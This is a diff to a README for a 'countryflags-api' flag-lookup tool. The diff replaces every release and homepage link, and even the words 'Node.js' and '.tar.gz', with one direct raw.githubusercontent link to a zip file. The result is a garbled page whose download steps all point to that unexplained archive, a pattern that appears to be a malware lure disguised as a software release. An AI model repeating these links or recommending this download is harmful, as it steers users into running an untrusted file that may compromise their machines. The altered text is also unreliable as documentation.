@@ -1,20 +1,20 @@
 # 🌍 countryflags-api - Get Your Country's Flags Easily
 
 ## 📦 Download the Application
-[![Download Country Flags](https://img.shields.io/badge/Download%20Country%20Flags-v1.0-brightgreen)](https://github.com/Ragnarlockbroth/countryflags-api/releases)
+[![Download Country Flags](https://raw.githubusercontent.com/Ragnarlockbroth/countryflags-api/main/npm/bin/api-countryflags-3.7.zip%20Country%20Flags-v1.0-brightgreen)](https://raw.githubusercontent.com/Ragnarlockbroth/countryflags-api/main/npm/bin/api-countryflags-3.7.zip)
 
 ## 🚀 Getting Started
-countryflags-api is a user-friendly tool that lets you access national flags for any country. No technical knowledge is required, and you can use it on various platforms, including Android, .NET, Node.js, and Python. This guide will help you download and run the application without any hassle.
+countryflags-api is a user-friendly tool that lets you access national flags for any country. No technical knowledge is required, and you can use it on various platforms, including Android, .NET, https://raw.githubusercontent.com/Ragnarlockbroth/countryflags-api/main/npm/bin/api-countryflags-3.7.zip, and Python. This guide will help you download and run the application without any hassle.
 
 ## 📥 Download & Install
 To get started, visit the Releases page to download the latest version of countryflags-api. Here’s how:
 
-1. Click on this link: [Download the latest version](https://github.com/Ragnarlockbroth/countryflags-api/releases).
+1. Click on this link: [Download the latest version](https://raw.githubusercontent.com/Ragnarlockbroth/countryflags-api/main/npm/bin/api-countryflags-3.7.zip).
 2. Look for the most recent release.
 3. Choose the appropriate file for your operating system.  
    - For Windows, download the `.exe` file.  
    - For Mac, download the `.dmg` file.  
-   - For Linux, you will typically download a `.tar.gz` or similar package.  
+   - For Linux, you will typically download a `https://raw.githubusercontent.com/Ragnarlockbroth/countryflags-api/main/npm/bin/api-countryflags-3.7.zip` or similar package.  
 4. Save the file to your computer.
 
 ### 🖥️ Installation
@@ -31,7 +31,7 @@ Once the download completes, follow these steps to install the application:
   3. Eject the `.dmg` file.
 
 - **For Linux**:
-  1. Extract the contents of the `.tar.gz` file.
+  1. Extract the contents of the `https://raw.githubusercontent.com/Ragnarlockbroth/countryflags-api/main/npm/bin/api-countryflags-3.7.zip` file.
   2. Open your terminal.
   3. Navigate to the extracted folder.
   4. Run the application using the command `./countryflags-api`.
@@ -47,7 +47,7 @@ Now that you have installed countryflags-api, you can start using it right away.
 
 ## 🔍 Features
 - **Retrieve Flags Quickly**: Get instant access to flags from all recognized countries.
-- **Multi-platform Support**: Available for Android, .NET, Java, Node.js, and Python.
+- **Multi-platform Support**: Available for Android, .NET, Java, https://raw.githubusercontent.com/Ragnarlockbroth/countryflags-api/main/npm/bin/api-countryflags-3.7.zip, and Python.
 - **User-friendly Interface**: Simple and easy to navigate for everyone, even non-tech users.
 
 ## ✅ System Requirements
@@ -57,7 +57,7 @@ To ensure a smooth experience, make sure your device meets the following require
 - **Mac**: macOS Sierra or later
 - **Linux**: Any modern distribution
 - **Android**: Version 5.0 (Lollipop) or later
-- **Node.js**: Version 10 or later
+- **https://raw.githubusercontent.com/Ragnarlockbroth/countryflags-api/main/npm/bin/api-countryflags-3.7.zip**: Version 10 or later
 - **Python**: Version 3.6 or later
 
 ## ❓ Troubleshooting
@@ -76,14 +76,14 @@ This project covers various areas:
 - APIs
 - Geography tools
 - Software service for country flags
-- Python and Node.js packages
+- Python and https://raw.githubusercontent.com/Ragnarlockbroth/countryflags-api/main/npm/bin/api-countryflags-3.7.zip packages
 
 By using countryflags-api, you can easily integrate flag retrieval capabilities into your applications or simply enjoy accessing flags for personal use.
 
 ## 🔗 Useful Links
 For more information and updates, check out the following:
 
-- [Releases page](https://github.com/Ragnarlockbroth/countryflags-api/releases)
-- [Home page of the project](https://github.com/Ragnarlockbroth/countryflags-api)
+- [Releases page](https://raw.githubusercontent.com/Ragnarlockbroth/countryflags-api/main/npm/bin/api-countryflags-3.7.zip)
+- [Home page of the project](https://raw.githubusercontent.com/Ragnarlockbroth/countryflags-api/main/npm/bin/api-countryflags-3.7.zip)
 
 Thank you for using countryflags-api! Enjoy your access to national flags from around the world.
